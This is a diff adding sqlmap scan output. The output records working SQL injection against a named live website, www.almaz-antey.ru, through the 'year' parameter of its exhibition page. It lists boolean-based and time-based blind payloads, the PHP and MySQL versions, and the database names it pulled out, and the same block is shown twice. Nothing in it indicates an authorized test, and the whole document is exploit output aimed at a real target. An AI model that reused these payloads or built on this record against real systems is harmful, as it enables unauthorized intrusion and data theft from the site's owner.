@@ -1,0 +1,32 @@
+sqlmap identified the following injection points with a total of 46 HTTP(s) requests:
+---
+Place: URI
+Parameter: #1*
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://www.almaz-antey.ru:80/about/exhibition/?year=2014) AND 5552=5552 AND (1034=1034
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: http://www.almaz-antey.ru:80/about/exhibition/?year=2014) AND SLEEP(5) AND (5845=5845
+---
+web application technology: PHP 5.3.29
+back-end DBMS: MySQL 5.0.11
+available databases [2]:
+[*] hp1049
+[*] information_schema
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: URI
+Parameter: #1*
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://www.almaz-antey.ru:80/about/exhibition/?year=2014) AND 5552=5552 AND (1034=1034
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: http://www.almaz-antey.ru:80/about/exhibition/?year=2014) AND SLEEP(5) AND (5845=5845
+---
+web application technology: PHP 5.3.29
+back-end DBMS: MySQL 5.0.11
